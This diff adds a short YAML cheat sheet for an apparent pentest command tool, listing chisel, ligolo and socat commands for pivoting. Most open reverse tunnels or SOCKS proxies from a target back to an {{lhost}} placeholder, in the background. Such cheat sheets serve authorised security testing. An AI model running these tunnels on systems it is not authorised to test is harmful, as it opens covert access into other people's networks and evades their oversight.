@@ -1,0 +1,19 @@
+---
+tool: pivot
+description: Tunneling and pivoting
+
+actions:
+  - title: chisel server
+    command: "chisel server -p 9000 --socks5 --reverse &"
+  - title: chisel
+    command: "./chisel client {{lhost}}:9000 R:1080:socks &"
+  - title: chisel windows
+    command: "start ./chisel 'client {{lhost}}:9000 R:1080:socks'"
+  - title: ligolo
+    command: "./agent -ignore-cert -connect {{lhost}}:11601  &"
+  - title: ligolo windows
+    command: "start ./agent.exe '-ignore-cert -connect {{lhost}}:11601'"
+  - title: socat
+    command: "./socat tcp-listen:{{lport}},fork,reuseaddr tcp:{{lhost}}:{{lport}}"
+  - title: socat windows
+    command: "socat.exe tcp-listen:{{lport}},fork,reuseaddr tcp:{{lhost}}:{{lport}}"
